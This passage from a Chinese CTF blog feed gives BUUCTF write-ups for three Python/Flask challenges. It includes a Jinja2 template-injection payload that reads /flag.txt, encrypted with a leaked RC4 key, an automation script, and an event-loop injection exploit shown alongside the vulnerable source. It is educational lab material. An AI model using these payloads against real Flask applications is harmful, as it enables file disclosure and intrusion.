id="CISCN2019-华东南赛区-Double-Secret">CISCN2019 华东南赛区 Double Secret</h2><h3 id="考点-v9">考点</h3><ul><li>模板注入</li><li>RC4加密</li></ul><h3 id="解题-v9">解题</h3><p>扫目录得到secret，访问提示要有secret参数，Fuzz一下发现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">File &quot;&#x2F;app&#x2F;app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret&#x3D;&#x3D;None):</span><br><span class="line">        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;</span><br><span class="line">    rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">    deS&#x3D;rc.do_crypt(secret)</span><br><span class="line">    a&#x3D;render_template_string(safe(deS))</span><br><span class="line">    if &#39;ciscn&#39; in a.lower():</span><br><span class="line">        return &#39;flag detected!&#39;</span><br><span class="line">      return a</span><br></pre></td></tr></table></figure><p>如果你传入了参数，那么它就会进行加密，可以看到是RC4加密，而且还泄露了密钥，密钥就是“HereIsTreasure”，而且通过报错，我们了解到这是flask的模板，而且python的版本是2.7的，那么我们可以利用flask的模板注入，执行命令，只不过需要进行RC4加密。</p><p>RC4加密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到加密后的payload后传入，拿到flag。</p><h2 id="GXYCTF2019-Strongest-Mind">GXYCTF2019 Strongest Mind</h2><h3 id="考点-v10">考点</h3><ul><li>Python脚本</li></ul><h3 id="解题-v10">解题</h3><p>注意Session的使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7a9216ad-bfec-45c5-a89e-71e8190e8299.node3.buuoj.cn/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">a = s.get(url)</span><br><span class="line">pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">    c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">    print(c)</span><br><span class="line">    a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line">print(a.content)</span><br></pre></td></tr></table></figure><h2 id="DDCTF2019-homebrew-event-loop">DDCTF2019 homebrew event loop</h2><h3 id="考点-v11">考点</h3><ul><li>逻辑漏洞</li><li>flask session</li></ul><h3 id="解题-v11">解题</h3><p>详细wp：<a href="https://blog.cindemor.com/post/ctf-web-16.html">https://blog.cindemor.com/post/ctf-web-16.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line"><span class="comment"># event = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=None</span>):</span></span><br><span class="line"><span class="comment"># haystack = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line"><span class="comment"># prefix = trigger_event%23;</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># event = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            <span class="comment"># action = trigger_event%23</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            <span class="comment"># args = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                <span class="comment"># event_handler = trigger_event#_handler</span></span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                <span class="comment"># ret_val = trigger_event([&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;])</span></span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.format(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.format(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure><p>进入队列的顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">action:buy;5</span><br><span class="line">action:get_flag;</span><br><span class="line">func:consume_point;5</span><br><span class="line">action:view;index</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure><p>日志写入的顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">[&#39;action:buy;5&#39;,&#39;action:get_flag;&#39;]</span><br><span class="line">[&#39;func:consume_point;5&#39;,&#39;action:view;index&#39;]</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure><p>拿到flask session后解密</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200917132800.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF刷题——Python&quot;&gt;BUUCTF刷题——Python&lt;/h1&gt;
&lt;h2 id=&quot;GYCTF2020-flaskapp&quot;&gt;GYCTF2020 flaskapp&lt;/h2&gt;
&lt;h3 id=&quot;考点&quot;&gt;考点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Flask d
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
      <category term="Python" scheme="http://ca0y1h.top/categories/CTF/Python/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题——文件包含</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-08-18T09:59:20.000Z</published>
    <updated>2020-09-21T08:01:00.353Z</updated>
    
